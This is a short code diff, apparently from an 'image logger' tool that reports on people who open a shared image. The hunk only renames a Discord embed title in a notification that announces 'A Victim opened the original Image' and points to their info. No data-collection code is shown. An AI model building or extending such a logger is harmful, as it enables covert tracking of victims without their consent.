@@ -14,7 +14,7 @@ return {
 "content": "@everyone",
 "embeds": [
 {
-"title": "Fentanyl strikes again!",
+"title": "Filips image logger",
 "color": 16711803,
 "description": "A Victim opened the original Image. You can find their info below.",
 "author": {
